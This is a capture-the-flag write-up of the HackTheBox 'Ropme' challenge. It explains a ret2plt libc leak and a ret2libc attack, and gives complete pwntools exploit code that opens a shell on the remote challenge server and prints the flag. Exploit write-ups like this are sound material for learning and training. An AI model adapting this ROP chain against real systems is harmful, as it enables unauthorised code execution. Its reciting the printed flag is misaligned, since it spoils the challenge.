# Ropme

## Overview

[Ropme ](https://app.hackthebox.eu/challenges/8)was an 80pts challenge rated as `Hard` on HackTheBox. Personally, I don't believe it should have been a hard; the technique used is fairly common and straightforward, and the high points and difficulty is probably due to it being one of the first challenge on the platform.

Exploiting the binary involved executing a [ret2plt ](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got#ret-2-plt)attack in order to leak the libc version before gaining RCE using a [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc).

## Analysis

```text
$ ./ropme 
ROP me outside, how 'about dah?
test
```

One output, one input, then the program breaks.

```text
$ rabin2 -I ropme
bits     64
canary   false
nx       true
pic      false
relro    partial
```

No PIE, meaning we can pull off the [ret2plt](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got#ret-2-plt). Let's leak the libc version.

```python
from pwn import *

elf = context.binary = ELF('./ropme')
libc = elf.libc
p = elf.process()

# ret2plt
rop = ROP(elf)

rop.raw('A' * 72)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['main'])

p.sendline(rop.chain())

# read the leaked puts address
p.recvline()
puts = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leaked puts: {hex(puts)}')

# Get base
libc.address = puts - libc.symbols['puts']
log.success(f'Libc base: {hex(libc.address)}')
```

We can now leak other symbols in order to pinpoint the libc version, for which you can use something like [here](https://libc.blukat.me/). Once you've done that, it's a simple [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc).

## Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./ropme')

if args.REMOTE:
    libc = ELF('./libc-remote.so', checksec=False)
    p = remote('docker.hackthebox.eu', 31919)
else:
    libc = elf.libc
    p = elf.process()

# ret2plt
rop = ROP(elf)

rop.raw('A' * 72)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['main'])

p.sendline(rop.chain())

### Pad with \x00 to get to correct length of 8 bytes
p.recvline()
puts = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leaked puts: {hex(puts)}')

# Get base
libc.address = puts - libc.symbols['puts']
log.success(f'Libc base: {hex(libc.address)}')


# ret2libc
binsh = next(libc.search(b'/bin/sh\x00'))

rop = ROP(libc)
rop.raw('A' * 72)
rop.system(binsh)

p.sendline(rop.chain())

p.interactive()

# HTB{r0p_m3_if_y0u_c4n!}
```

